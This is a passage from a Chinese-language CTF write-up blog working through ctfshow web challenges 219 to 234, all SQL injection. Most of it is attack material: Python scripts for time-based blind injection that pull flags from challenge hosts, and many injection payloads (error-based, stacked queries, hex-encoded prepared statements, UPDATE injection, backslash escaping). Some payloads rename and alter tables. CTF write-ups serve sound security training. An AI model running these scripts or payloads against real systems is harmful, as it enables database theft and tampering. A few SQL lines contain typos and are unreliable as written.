class="comment">#ctfshow&#123;96c90aaa-5a9f-48bf-9ff0-814874d503f1&#125;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> :<span class="string">f&quot;1) or if((ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)))&gt;<span class="subst">&#123;mid&#125;</span>,1,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H)&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url , data= data ,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#time.sleep(0.3)</span></span><br><span class="line">            head = mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            tail = mid</span><br><span class="line">            time.sleep(<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        ans += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>

<h1 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408184439334.png" alt="image-20220408184439334"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://51762119-b7e0-4b2a-a392-0f5fded552ac.challenge.ctf.show/api/&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="built_in">dir</span> = <span class="string">&quot;cfi_1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolpQWERTYUIOPASDFGHJKLZXCVBNM&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">        ans += i</span><br><span class="line"></span><br><span class="line">        <span class="comment">#表名 ctfshow_flagxcac</span></span><br><span class="line">        <span class="comment">#payload = &quot;select table_name from information_schema.tables where table_schema=database() limit 0,1&quot;</span></span><br><span class="line">        <span class="comment">#字段名 ctfshow_flagxcac</span></span><br><span class="line">        payload = <span class="string">&quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1&quot;</span></span><br><span class="line">        <span class="comment"># 数据 防止查错咱们多等会呗 我直接就查一个</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaabcc from ctfshow_flagxcac&quot;</span></span><br><span class="line">        <span class="comment">#ctfshow&#123;96c90aaa-5a9f-48bf-9ff0-814874d503f1&#125;</span></span><br><span class="line">        <span class="comment">#print(f&quot;if(ord(left(&#123;payload&#125;,&#123;i&#125;))&gt;&#123;mid&#125;,1,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H)&quot;)</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> :<span class="string">f&quot;1) or if((left((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;j&#125;</span>))=&#x27;<span class="subst">&#123;ans&#125;</span>&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url , data= data ,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#time.sleep(0.3)</span></span><br><span class="line">            ans = ans[:-<span class="number">1</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;正确&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(ans)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">6</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;错误&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h1><h2 id="limit报错注入"><a href="#limit报错注入" class="headerlink" title="limit报错注入"></a>limit报错注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408211002396.png" alt="image-20220408211002396"></p>
<p>mysql利用procedure analyse()函数优化表的结构</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408211135617.png" alt="image-20220408211135617"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?page=1&amp;limit=10  procedure analyse(extractvalue(rand(),concat(0x3a,database())),2)</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408212617134.png" alt="image-20220408212617134"></p>
<p>直接提交这个数据库哦</p>
<p>还有这个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?page=1&amp;limit=10  procedure analyse((updatexml(1,concat(0x7e,database(),0x7e),1)),2)</span><br></pre></td></tr></table></figure>

<h1 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h1><h2 id="group-by-注入"><a href="#group-by-注入" class="headerlink" title="group by 注入"></a>group by 注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408213246662.png" alt="image-20220408213246662"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from ctfshow_user group by 1,if(1=1,sleep(1),1);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408214846588.png" alt="image-20220408214846588"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408215003341.png" alt="image-20220408215003341"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408215023841.png" alt="image-20220408215023841"></p>
<p>显然可以盲注</p>
<p>数字被禁了可以使用true绕过</p>
<h1 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408220113624.png" alt="image-20220408220113624"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408220136403.png" alt="image-20220408220136403"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408220153265.png" alt="image-20220408220153265"></p>
<p>重置成admin admin登录一下</p>
<h1 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h1><h2 id="堆叠注入-handler读数据"><a href="#堆叠注入-handler读数据" class="headerlink" title="堆叠注入 handler读数据"></a>堆叠注入 handler读数据</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408221302428.png" alt="image-20220408221302428"></p>
<p>没有过滤show</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;show databases;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408221705966.png" alt="image-20220408221705966"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;show tables;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408221725973.png" alt="image-20220408221725973"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;handler ctfshow_flagasa close;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>预处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;SET @sqli=concat(char(115,101,108,101,99,116),&#x27; database()&#x27;);PREPARE st from @sqli;EXECUTE st;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>



<h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>mysql将prepare execute deallocate统称为 PREPARE STATEMENT.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PREPARE name from &#x27;[my sql sequece]&#x27;;	#预定义sql语句</span><br><span class="line">EXECUTE name; 						#执行预定义的sql语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE name; 		#珊瑚预定义sql语句 	</span><br></pre></td></tr></table></figure>

<p>字符串定义预处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PREPARE stmt1 FROM &#x27;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#x27;;</span><br><span class="line">ET @a = 3;</span><br><span class="line">SET @b = 4;</span><br><span class="line">EXECUTE stmt1 USING @a, @b;</span><br></pre></td></tr></table></figure>

<p>变量定义预处理sql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET @s = &quot;SELECT SQRT(POW(?,2) + POW (?,2)) AS hypotenuse&quot;;</span><br><span class="line">PREPARE stmt2 FROM @s;</span><br><span class="line">SET @c = 6;</span><br><span class="line">ET @d = 8;</span><br><span class="line">EXECUTE stmt2 USING @c,@d;</span><br><span class="line">DEALLOCATE PREPARE stmt2;</span><br></pre></td></tr></table></figure>

<h3 id="常规堆叠注入"><a href="#常规堆叠注入" class="headerlink" title="常规堆叠注入"></a>常规堆叠注入</h3><p>习惯扫目录,没扫到</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151506062.png" alt="image-20220315150640013"></p>
<p>输入单引号,报错得出数据库mariadb </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1#回显正常</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151507620.png" alt="image-20220315150758543"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3#报错</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151510055.png" alt="image-20220315151004003"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2#正常</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151510359.png" alt="image-20220315151033307"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2#发现有过滤</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151511268.png" alt="image-20220315151126218"></p>
<p>大小写也绕不过</p>
<p>那么只能堆叠注入了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151513103.png" alt="image-20220315151331036"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11&#x27;;show tables;#</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151514104.png" alt="image-20220315151416056"></p>
<p>这里查看一个flag在那个字段里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;desc `1919810931114514`;#</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151516959.png" alt="image-20220315151658903"></p>
<p>查一下下一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;desc `words`;# 这里也可以不加`` </span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151519393.png" alt="image-20220315151902329"></p>
<p>那么这里面的id就有可能是我们查询时输入的值了,他的查询语句就可能是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,data from words where id=&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>如果是这样的话,我们就可以将这里的words替换成1919810931114514将flag替换成id从而实现获取数据.那么可以将1919810931114514改名为words,在这之前需要先将words改下名,改成别的如word1.将flag改成data.但是在1919810931114514并没有id这个列名,那么我们可以给他添加一组id.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not NULL auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>

<p>接着才查询1</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151529964.png" alt="image-20220315152912904"></p>
<h3 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a>预处理语句</h3><p>用法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SER @tn = &#x27;hahaha&#x27;; 					#存储表名</span><br><span class="line">SET @sql =concat(&#x27;select * from &#x27;,@tn);	#存储sql语句</span><br><span class="line">PREPARE name from @sql; 				#预处理sql语句</span><br><span class="line">EXECUTE name; 							#执行预定义sql语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE sqla; 		#删除预定义sql</span><br></pre></td></tr></table></figure>

<p>本题即可利用char()函数将select的ascii码转换成select字符串,接着利用concat()函数进行拼接得到select查询语句从而绕过过滤.或者直接使用concat()函数拼接select来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char(115,101,108,101,99,116)等价于select&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;SET @sqli=concat(char(115,101,108,101,99,116),&#x27;</span><span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`<span class="string">&#x27;);PREPARE st from @sqli;EXECUTE st;#</span></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;PREPARE st from concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect<span class="string">&#x27;, &#x27;</span> <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>` <span class="string">&#x27;);EXECUTE st;#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;SET @sqli=concat(char(115,101,108,101,99,116),&#x27; database()&#x27;);PREPARE st from @sqli;EXECUTE st;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;SET @sqli=concat(char(115,101,108,101,99,116),&#x27; database()&#x27;);PREPARE st from @sqli;EXECUTE st;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<h1 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h1><h2 id="16进制预处理堆叠注入"><a href="#16进制预处理堆叠注入" class="headerlink" title="16进制预处理堆叠注入"></a>16进制预处理堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409101024519.png" alt="image-20220409101024519"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>记得十六进制前面加0x哦</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409101420720.png" alt="image-20220409101420720"></p>
<p>字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c6167617327;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<h1 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409101938137.png" alt="image-20220409101938137"></p>
<p>这道题考点其实是查看MySQL的存储过程.看看网上这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数</a>.我们去查information_schema.routines表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409102115511.png" alt="image-20220409102115511"></p>
<h1 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h1><p>和226差不多</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409102337468.png" alt="image-20220409102337468"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c61676173616127;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c65637420666c6167617362612066726f6d2063746673685f6f775f666c616761736161;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<h1 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409102757765.png" alt="image-20220409102757765"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27666c616727;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c65637420666c6167617362612066726f6d20666c6167;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<h1 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409103050744.png" alt="image-20220409103050744"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27666c6167616162627827;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c65637420666c616761736261732066726f6d20666c61676161626278;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<h1 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h1><h2 id="updata注入"><a href="#updata注入" class="headerlink" title="updata注入"></a>updata注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409103315126.png" alt="image-20220409103315126"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409103537495.png" alt="image-20220409103537495"></p>
<p>还是这里找发送参数</p>
<p>简单闭合一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update ctfshow_user set pass = &#x27;1&#x27;,username=user() where 1=1#&#x27; where username = &#x27;1&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409103848475.png" alt="image-20220409103848475"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">password=1&#x27;,username=user()#&amp;username=1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409103833385.png" alt="image-20220409103833385"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">password=1&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) #&amp;username=1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">password=1&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flaga&#x27;)#&amp;username=1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">password=1&#x27;,username=(select flagas from flaga)#&amp;username=1</span><br><span class="line">password=1&#x27;,username=(select a from (select group_concat(flagas)a from flaga) 1) ;#&amp;username=1</span><br></pre></td></tr></table></figure>

<h1 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409104334331.png" alt="image-20220409104334331"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">password=1&#x27;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409105435149.png" alt="image-20220409105435149"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">password=1&#x27;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flagaa&#x27;)#&amp;username=1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=1&#x27;),username=(select flagass from flagaa)#&amp;username=1</span><br><span class="line">password=1&#x27;),username=(select a from (select group_concat(flagas)a from flaga) 111) ;#&amp;username=1</span><br></pre></td></tr></table></figure>



<h1 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h1><h2 id="updata盲注"><a href="#updata盲注" class="headerlink" title="updata盲注"></a>updata盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409105751661.png" alt="image-20220409105751661"></p>
<p>盲注</p>
<p>测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://ad2cbb74-6e31-4f3d-bffc-6d989a5760f7.challenge.ctf.show/api/&quot;</span></span><br><span class="line">payload = <span class="string">&quot;length(database())=0&quot;</span> <span class="comment">#没延迟</span></span><br><span class="line">payload = <span class="string">&quot;length(database())&gt;0&quot;</span> <span class="comment">#延迟</span></span><br><span class="line">date = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;1&#x27; or if(<span class="subst">&#123;payload&#125;</span>,sleep(0.05),1) #&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.post(url, data=date, timeout=<span class="number">0.9</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;没延迟&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;延迟&#x27;</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1&amp;limit=10&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查表名</span></span><br><span class="line">        <span class="comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;flag233333&#x27; limit 1,1&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagass233 from flag233333&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;1&#x27; or if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.05),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;4&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">0.9</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h1><h2 id="逃逸字符"><a href="#逃逸字符" class="headerlink" title="\逃逸字符"></a>\逃逸字符</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409115745252.png" alt="image-20220409115745252"></p>
<p>单引号被过滤了,但是可以通过 \ 逃逸字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;update ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;&quot;;</span><br></pre></td></tr></table></figure>

<p>就像这样,我们给pass传入一个 \ 那么这个’就被转义了</p>
